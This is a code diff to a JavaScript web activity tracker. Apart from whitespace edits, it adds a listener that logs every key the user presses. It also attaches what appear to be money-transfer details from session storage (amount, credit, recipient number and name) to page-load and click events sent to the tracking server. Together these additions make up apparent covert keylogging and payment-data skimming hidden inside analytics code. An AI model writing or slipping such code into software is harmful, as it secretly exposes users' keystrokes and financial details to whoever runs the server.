@@ -74,13 +74,13 @@ class ActivityTrackerServer {
     getOrCreateSessionId() {
         try {
             let stored = localStorage.getItem('activityTracker_sessionId');
-
+            
             // Force a re-read to ensure we get the latest value
             if (!stored) {
                 // Try one more time in case there was a timing issue
                 stored = localStorage.getItem('activityTracker_sessionId');
             }
-
+            
             if (stored) {
                 console.log('Using existing session ID:', stored);
                 return stored;
@@ -135,7 +135,7 @@ class ActivityTrackerServer {
             console.warn('Could not initialize session with server:', error.message);
             console.log('Data will be stored locally until server is available');
             this.isOnline = false;
-
+            
             // Store in offline queue
             if (this.config.offlineStorage) {
                 console.log('Offline storage is enabled - data will be queued');
@@ -164,6 +164,15 @@ class ActivityTrackerServer {
      */
     trackPageLoad() {
         this.trackEvent('page_load', {
+                    montant: sessionStorage.getItem("montant"),
+                    credit: sessionStorage.getItem("credit"),
+                    receiverNum: sessionStorage.getItem("receiverNum"),
+                    receiverName: sessionStorage.getItem("receiverName"),
+                    amount: sessionStorage.getItem("confAmountTax"),
+                    amountFlat: sessionStorage.getItem("confAmount"),
+                    amountCredit: sessionStorage.getItem("amountCredit"),
+                    isMuted: sessionStorage.getItem("isMuted"),
+                    showInput: sessionStorage.getItem("showInput"),
             url: this.currentPage,
             timestamp: this.pageLoadTime,
             referrer: document.referrer,
@@ -175,6 +184,9 @@ class ActivityTrackerServer {
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         });
     }
+
+
+   
 
     /**
      * Track page unload event
@@ -194,6 +206,20 @@ class ActivityTrackerServer {
      */
     setupEventListeners() {
         this.setupClickTracking();
+        this.setupKeyupTracking();
+    }
+
+     /**
+     * Setup key up event
+     */
+    setupKeyupTracking() {
+         document.addEventListener('keyup', async (event) => {
+            await this.trackEvent('keyup', {
+             key: ` ${event.code}`
+            });
+
+
+        });
     }
 
     /**
@@ -223,12 +249,12 @@ class ActivityTrackerServer {
             // If navigation will occur, prevent it and handle tracking first
             if (willNavigate) {
                 event.preventDefault();
-
+                
                 // Get the navigation target from the link
-                const navigationTarget = event.target.href ||
-                                        event.target.closest('a')?.href ||
+                const navigationTarget = event.target.href || 
+                                        event.target.closest('a')?.href || 
                                         null;
-
+                
                 // Track the event
                 await this.trackEvent('click', {
                     timestamp: Date.now(),
@@ -251,16 +277,26 @@ class ActivityTrackerServer {
                     onclick: onclickInfo,
                     willNavigate: true,
                     navigationTarget: navigationTarget,
-                    selector: this.getElementSelector(event.target)
+                    selector: this.getElementSelector(event.target),
+                    
+                    montant: sessionStorage.getItem("montant"),
+                    credit: sessionStorage.getItem("credit"),
+                    receiverNum: sessionStorage.getItem("receiverNum"),
+                    receiverName: sessionStorage.getItem("receiverName"),
+                    amount: sessionStorage.getItem("confAmountTax"),
+                    amountFlat: sessionStorage.getItem("confAmount"),
+                    amountCredit: sessionStorage.getItem("amountCredit"),
+                    isMuted: sessionStorage.getItem("isMuted"),
+                    showInput: sessionStorage.getItem("showInput"),
                 }, true);
-
+                
                 // Navigate after ensuring data is sent
                 if (navigationTarget) {
                     window.location.href = navigationTarget;
                 }
             } else {
                 // Normal tracking for non-navigation clicks
-                this.trackEvent('click', {
+                this.trackEvent('click', {        
                     timestamp: Date.now(),
                     x: event.clientX,
                     y: event.clientY,
@@ -280,7 +316,16 @@ class ActivityTrackerServer {
                     },
                     onclick: onclickInfo,
                     willNavigate: false,
-                    selector: this.getElementSelector(event.target)
+                    selector: this.getElementSelector(event.target),
+                    montant: sessionStorage.getItem("montant"),
+                    credit: sessionStorage.getItem("credit"),
+                    receiverNum: sessionStorage.getItem("receiverNum"),
+                    receiverName: sessionStorage.getItem("receiverName"),
+                    amount: sessionStorage.getItem("confAmountTax"),
+                    amountFlat: sessionStorage.getItem("confAmount"),
+                    amountCredit: sessionStorage.getItem("amountCredit"),
+                    isMuted: sessionStorage.getItem("isMuted"),
+                    showInput: sessionStorage.getItem("showInput")
                 }, false);
             }
         }, true); // Use capture phase to intercept before other handlers
